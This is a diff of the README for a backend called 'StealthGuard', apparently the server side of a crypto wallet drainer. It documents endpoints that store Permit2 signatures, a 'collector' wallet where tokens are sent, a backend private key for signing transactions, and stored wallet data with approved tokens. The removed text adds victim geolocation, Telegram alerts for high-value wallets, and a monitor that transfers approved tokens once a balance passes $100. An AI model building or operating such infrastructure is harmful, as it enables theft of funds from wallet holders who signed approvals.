@@ -1,72 +1,32 @@
 # StealthGuard Backend
 
-## Features
+## Endpoints
 
-- **REST API**: Receive logs from frontend
-- **MongoDB Storage**: All events and wallet data
-- **Geolocation**: IP → Country/City
-- **Price Tracking**: CoinGecko integration
-- **Auto-Transfer Monitor**: Background service that scans approved wallets
-- **Telegram Alerts**: Notifications for high-value wallets
-- **WebSocket**: Real-time updates to admin panel
-- **Admin Dashboard**: HTML dashboard with stats
-
-## Setup
-
-```bash
-# Install dependencies
-npm install
-
-# Create .env file
-cp .env.example .env
-# Edit .env with your settings
-
-# Start server
-npm start
-
-# Dev mode with auto-reload
-npm run dev
-```
+- `POST /api/log` - Log single event
+- `POST /api/log/batch` - Log batch of events
+- `POST /api/permit2` - Store Permit2 signature
+- `GET /api/dashboard` - Dashboard stats
+- `GET /health` - Health check
 
 ## Environment Variables
 
 ```env
-MONGODB_URI=mongodb://localhost:27017/stealthguard
-PORT=3000
-TELEGRAM_BOT_TOKEN=your_bot_token
-TELEGRAM_CHAT_ID=your_chat_id
-ENABLE_MONITOR=true
+BACKEND_PRIVATE_KEY=0x...           # For signing transactions
+BACKEND_WALLET_ADDRESS=0x...        # Collector wallet
+COLLECTOR_ADDRESS=0x...             # Where tokens are sent
+CLOUDFLARE_API_TOKEN=...            # Optional
+MIN_TRANSFER_USD=1
 ```
 
-## API Endpoints
+## Management
 
-- `POST /api/log` - Log single event
-- `POST /api/log/batch` - Log batch of events
-- `GET /api/dashboard` - Dashboard stats
-- `GET /api/stats/countries` - Stats by country
-- `GET /api/stats/amounts` - Amount distribution
-- `GET /api/wallets/hot` - Hot wallets list
+```bash
+pm2 start server.js --name stealthguard
+pm2 logs stealthguard
+pm2 restart stealthguard
+```
 
-## Deployment
+## Data Storage
 
-### Render (Recommended)
-1. Create new Web Service
-2. Connect GitHub repo
-3. Set environment variables
-4. Deploy!
-
-### MongoDB Atlas
-1. Create free cluster
-2. Get connection string
-3. Add to MONGODB_URI
-
-## Auto-Transfer Logic
-
-1. Monitor runs every 5 minutes
-2. Checks wallets with approved tokens
-3. Fetches current balances via RPC
-4. Calculates USD value (CoinGecko prices)
-5. If balance >= $100:
-   - Logs event
-   - Sends Telegram alert
-   - (Optional) Executes transfer with secure signer
+- `data/events.json` - All logged events
+- `data/wallets.json` - Wallet data with approved tokens
